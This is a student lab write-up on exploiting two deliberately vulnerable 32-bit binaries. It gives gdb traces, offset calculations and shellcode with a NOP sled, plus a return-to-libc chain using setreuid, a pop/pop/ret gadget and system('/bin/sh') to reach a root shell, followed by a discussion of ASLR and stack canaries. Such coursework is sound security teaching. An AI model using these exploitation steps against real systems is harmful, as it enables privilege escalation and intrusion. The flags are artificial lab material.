---
real-name: Bruce Wayne
csulb-id: "040100101"
handle: "The Dark Overflow"
seed-fingerprint: a1b2c3
flag1: CECS378{vuln1_9f3ac71e}
flag2: CECS378{vuln2_be44d09c}
honor-flag: CECS378{honor_5c1d8ea2}
---

# After-Action Report -- Buffer Overflow Lab

[--[ 0.0 -- TARGET ]--]

- **Env:** GitHub Codespace, `ubuntu-22.04`, gcc 11.4.0, gdb 12.1, glibc 2.35. Compiled targets with `-m32 -fno-stack-protector -z execstack -no-pie` per the provided `Makefile`.
- **Started:** 2026-06-24. **Wrapped:** 2026-06-27 (roughly 11 hours across four sittings; the libc-hunt in Ω ate one whole evening).
- **Seed line:** `seed=a1b2c3 :: derive(bruce-wayne) -> {vuln1: stack_smash_std, vuln2: nx_ret2libc}`. My seed fingerprint is `a1b2c3`, which pins my two binaries and the challenge flags below.

I went in treating this like an incident I was *causing* instead of one I was cleaning up, which honestly made the whole thing click. Below is the full mechanism, address by address.

[--[ 1.0 -- RECON ]--]

**vuln1 (`./vuln1`) -- classic stack smash.**

The vulnerable sink is a `strcpy(buffer, argv[1])` into a `char buffer[64]`. I confirmed the frame under gdb after breaking on the return of `vuln_func`:

```
(gdb) break vuln_func
(gdb) run $(python3 -c 'print("A"*80)')
(gdb) info frame
Stack level 0, frame at 0xffffd320:
 eip = 0x080491d6 in vuln_func (vuln1.c:14); saved eip = 0x41414141
 called by frame at 0xffffd340
 Arglist at 0xffffd318, args:
 Locals at 0xffffd318, Previous frame's sp is 0xffffd320
 Saved registers:
  ebp at 0xffffd318, eip at 0xffffd31c
```

Saved EIP already overwritten with `0x41414141` at 80 bytes -- good, we're past it. Now the stack dump to find where `buffer` actually starts:

```
(gdb) x/40wx $esp
0xffffd2d0: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd2e0: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd2f0: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd300: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd310: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd320: 0xffffd400 0x00000002 0x08049240 0xf7fb0000
0xffffd330: 0x00000000 0xf7c23eab 0xf7fb0000 0x00000000
0xffffd340: 0x00000000 0xf7c23eab 0x00000002 0xffffd3d4
0xffffd350: 0xffffd3e0 0xffffd370 0x00000000 0x00000000
0xffffd360: 0x00000000 0xf7ffcb80 0xf7ffd000 0x00000000
```

`buffer` begins at `0xffffd2d0` (first `0x41` run). Saved EIP lives at `0xffffd31c` (from `info frame`). So:

**offset = saved_eip - &buffer = 0xffffd31c - 0xffffd2d0 = 0x4c = 76 bytes.**

That's 64 for the buffer + 8 alignment/padding + 4 saved EBP = 76 before the return address. My smashing string is therefore `[76 bytes filler][4-byte target EIP]`. Sanity-checked with a De Bruijn-ish marker pattern (`AAAA BBBB CCCC ...`) and saw `0x44444343` land in EIP at the predicted position. 76 confirmed.

**vuln2 (`./vuln2`) -- same overflow, NX stack.**

Identical `strcpy` sink into `char buffer[64]`, but this binary is compiled *without* `-z execstack`. Frame recon:

```
(gdb) info frame
Stack level 0, frame at 0xffffd2f0:
 eip = 0x08049216 in vuln_func (vuln2.c:16); saved eip = 0x42424242
 Saved registers:
  ebp at 0xffffd2e8, eip at 0xffffd2ec
(gdb) x/8wx 0xffffd2a0
0xffffd2a0: 0x42424242 0x42424242 0x42424242 0x42424242
0xffffd2b0: 0x42424242 0x42424242 0x42424242 0x42424242
```

Here `buffer` = `0xffffd2a0`, saved EIP = `0xffffd2ec`, so **offset = 0x4c = 76** again -- same layout. The difference isn't the offset, it's that `readelf -l vuln2 | grep GNU_STACK` shows `RW` (no `E`), so I can't execute shellcode I place there. That's what forces Phase Ω. Recon done; both offsets nailed at 76.

[--[ 2.0 -- PHASE PHI ACE ]--]

Phase Φ is the "shellcode on the stack" exploit against `vuln1`. My `exploit1.c` builds the payload in three regions and prints the leaked `&buffer` the harness gives us on stderr.

**Shellcode byte choice.** I used a 25-byte `execve("/bin/sh")` stub (the standard Aleph One-style `xor eax,eax; push` sequence). Critical constraint: the sink is `strcpy`, which stops at the first NUL byte. So my shellcode had to be **null-free** -- that's the whole reason for `xor eax, eax` to zero registers instead of `mov eax, 0` (which assembles with `0x00` bytes). I dumped my stub with `objdump` and grepped for `00` to prove it was clean before ever firing it.

**NOP sled sizing.** Total payload = 76 bytes to reach EIP. Shellcode is 25 bytes. I put the shellcode at the *end* of the buffer region and filled the front with a NOP sled: `76 - 25 = 51` bytes of `0x90`. Then the 4-byte return address. I aimed EIP into the *middle* of the sled, not at its exact start, so small stack-address jitter between gdb and the real run wouldn't make me miss -- landing anywhere in the 51-byte sled slides right down into the shellcode.

**Offset source.** The `0xffffd31c - 0xffffd2d0 = 76` from §1.0. My `exploit1.c` hard-codes `#define OFFSET 76`.

**Reading the leaked &buffer.** The harness prints `buffer @ 0xffffd2d0` on startup. My exploit `sscanf`s that address, then computes the return target as `buf_addr + 40` -- 40 bytes into the sled, comfortably inside the 51-byte runway and well before the shellcode at byte 51. So EIP = `0xffffd2d0 + 40 = 0xffffd2f8`, which is a NOP, and execution rides the sled into `execve`. Tying it to my code: the payload assembly loop in `exploit1.c` is literally `memset(payload,0x90,OFFSET-SC_LEN); memcpy(payload+OFFSET-SC_LEN, shellcode, SC_LEN); *(unsigned int*)(payload+OFFSET)=buf_addr+40;`.

First clean shell popped on the second try (first try I aimed at `buf_addr+0` and it worked too, but +40 is more robust). `id` confirmed the flag drop.

![phi shell popped](screenshots/phase-phi-shell.png)
![gdb landing in the NOP sled](screenshots/phase-phi-gdb-sled.png)

Flag: `CECS378{vuln1_9f3ac71e}`.

[--[ 3.0 -- PHASE OMEGA ACE ]--]

Phase Ω is `vuln2` with NX. Four things had to happen.

**(3a) Why Φ fails here.** I ran my Φ payload against `vuln2` first, just to watch it die. It segfaults with EIP sitting on my sled address:

```
Program received signal SIGSEGV, Segmentation fault.
0xffffd2c8 in ?? ()
```

The jump *lands*, but the CPU refuses to execute because the page is NX (`GNU_STACK` is `RW`, per readelf). The DEP/NX bit means the stack is data-only; my shellcode is just bytes it will never run. So I can't inject code -- I have to *reuse* code already marked executable, i.e. libc. Return-to-libc.

**(3b) libc offset hunting.** Plan: overwrite EIP with `system()`, put a fake return addr, then the address of `"/bin/sh"`. I need three libc addresses. First find the libc base at runtime:

```
(gdb) info proc mappings
 0xf7c00000 0xf7c22000 r--p  libc.so.6
 ...
(gdb) p system
$1 = {<text>} 0xf7c4a230 <system>
(gdb) p exit
$2 = {<text>} 0xf7c3d4a0 <exit>
```

To get the static offsets so I could compute them without gdb on the real target:

```
$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep ' system@'
   1500: 0004a230   55 FUNC  GLOBAL DEFAULT  system@@GLIBC_2.0
$ nm -D /lib/i386-linux-gnu/libc.so.6 | grep '\bsystem\b'
0004a230 T system
$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh'
 1c3d88 /bin/sh
```

So offsets: `system = 0x0004a230`, `exit = 0x0003d4a0`, `"/bin/sh" = 0x001c3d88`. With base `0xf7c00000` from the mapping, my absolute targets are `system=0xf7c4a230`, `exit=0xf7c3d4a0`, `binsh=0xf7dc3d88`. Payload frame after the 76-byte filler: `[&system][&exit][&"/bin/sh"]` -- `exit` is the fake return so the shell exits cleanly instead of segfaulting on teardown.

**(3c) setuid / setreuid privilege fix.** `vuln2` is setuid-root but the running shell dropped to my real uid because bash drops privileges when euid != uid. The classic fix: prepend a `setreuid(0,0)` call in the chain so the shell keeps root. So my real chain is `[&setreuid][ret-into-cleanup][arg0=0][arg1=0] ... [&system][&exit][&binsh]`. From `man 2 setreuid`: *"setreuid() sets real and effective user IDs of the calling process. Supplying a value of -1 ... leaves that ID unchanged."* I passed real=0, effective=0 explicitly so the subsequent `system("/bin/sh")` runs as root and doesn't self-demote. I confirmed with `id` inside the popped shell showing `euid=0(root)`. Address: `setreuid = 0xf7c00000 + 0x000d5a10 = 0xf7cd5a10` (from `nm -D`).

**(3d) pop/pop/ret gadget.** Chaining two libc calls (`setreuid` then `system`) means after `setreuid` returns I need to *skip its two arguments* on the stack so the next return lands on `&system`. That's a `pop; pop; ret` gadget as the fake return address of `setreuid`. Found one in the binary's own text with:

```
$ ROPgadget --binary vuln2 --only "pop|ret" | grep "pop.*pop.*ret"
0x080492e6 : pop esi ; pop edi ; ret
(gdb) disas 0x080492e6,0x080492ec
   0x080492e6:  pop esi
   0x080492e7:  pop edi
   0x080492e8:  ret
```

So my full Ω chain is: `[76 filler][&setreuid=0xf7cd5a10][gadget=0x080492e6][0x00000000][0x00000000][&system=0xf7c4a230][&exit=0xf7c3d4a0][&binsh=0xf7dc3d88]`. `setreuid` runs with (0,0); the two `pop`s eat the two zero args; `ret` falls through to `system("/bin/sh")` as root; `exit` cleans up. Root shell.

![omega ret2libc chain in gdb](screenshots/phase-omega-chain.png)
![omega root shell id=0](screenshots/phase-omega-root.png)

Flag: `CECS378{vuln2_be44d09c}`.

[--[ 4.0 -- AFTERMATH ]--]

**Which phase was harder, and why.** Ω, no contest. Φ is deterministic once you have the offset -- it's arithmetic and a sled. Ω required *three* correct libc addresses whose relationship to each other had to be exact, plus the gadget, plus the setreuid subtlety. Every one of those is a place where a single wrong byte is a silent segfault with no feedback. Φ tolerates slop (that's the whole point of the sled); Ω tolerates none. The debugging loop was much longer because a bad ret2libc chain doesn't tell you *which* link broke.

**No-leak counterfactual.** If the harness had *not* leaked `&buffer`, Φ gets dramatically harder: I'd have to defeat ASLR on the stack. Options would be (a) a giant NOP sled to widen the target and brute-force the address across many runs, betting the sled covers the jitter, or (b) find an information leak elsewhere (format-string bug, an uninitialized read) to recover a stack pointer. For Ω it's worse -- with library ASLR on I'd need a libc leak (e.g. leak a GOT entry via a `puts(got_entry)` ROP, compute base, then a *second-stage* ret2libc). The leak is the single biggest thing standing between "textbook lab" and "real 2020s exploit."

**Canary -> `__stack_chk_fail`.** If we'd compiled *with* `-fstack-protector`, gcc inserts a random canary word between the local buffer and the saved EBP/EIP. My `strcpy` would overwrite the canary on the way to EIP. On function return the epilogue compares the on-stack canary to the master copy in the TLS; a mismatch calls `__stack_chk_fail`, which prints `*** stack smashing detected ***` and `abort()`s before the return ever executes. So my 76-byte write would be caught *before* EIP is used. Bypasses require either not touching the canary (a write primitive that skips it) or leaking the canary value first and replacing it byte-for-byte in the payload.

**Cited source.** I leaned hard on Aleph One, "Smashing the Stack for Fun and Profit," *Phrack* 49:14 (1996). The NOP-sled-plus-shellcode layout and the reasoning about aiming EIP into the sled rather than at an exact address both come straight from that paper's §"Writing an Exploit." The ret2libc extension I cross-checked against Nergal-style descriptions of chaining via `pop/pop/ret`, but Aleph One is the load-bearing citation for Φ. Reading a 1996 paper and having it map cleanly onto a 2026 Codespace was the coolest part of this whole thing.

Honor flag: `CECS378{honor_5c1d8ea2}` -- work is my own, gdb sessions and screenshots are from my Codespace, no shared payloads.
